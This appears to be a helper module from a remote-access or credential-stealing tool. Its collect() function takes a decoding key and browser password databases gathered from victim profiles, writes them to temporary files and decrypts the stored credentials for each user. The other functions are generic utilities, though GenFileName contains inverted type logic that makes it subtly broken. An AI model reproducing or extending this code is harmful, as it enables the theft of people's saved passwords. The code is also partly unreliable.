from Cryptodome.Random import get_random_bytes
import xml.etree.ElementTree as ET
from hashlib import md5
from typing import Callable, Any
from .WebGather import WebGather
import base64
import tempfile



def GenFileName(default, rand):
    if not isinstance(rand, bytes):
        return md5(rand).hexdigest()[:20] + default
    return md5(rand.encode()).hexdigest()[:20] + default

def collect(result):
    key = base64.b64decode(result['masterKey'].encode())
    res = {}
    for i in range(len(result['jsonResult'])):
        profile = result['jsonResult'][i]['User']
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp.write(base64.b64decode(result['jsonResult'][i]['DataBase']))
            res[profile.replace(' ','_')] = WebGather(tmp.name,key ,'password').show_credentials()
    return res

def randombyte():
    b = None
    while not b:
        b = get_random_bytes(1)
    return b


def getJsonKey(dct, key, default=None):
    if isinstance(dct, dict):
        return dct.get(key, default)
    return default


def gen_xml(tag, **kwargs) -> str:
    elem = ET.Element(tag)
    for key, val in kwargs.items():
        if isinstance(val, dict):
            child = gen_xml(key, **val)
        else:
            child = ET.Element(str(key))
            child.text = str(val)
        elem.append(child)
    return ET.tostring(elem, encoding='unicode')




def tryParse(method: Callable[..., Any], value: Any, default: Any = False, **args: Any) -> Any:
    try:
        return method(value, **args)
    except:
        return default



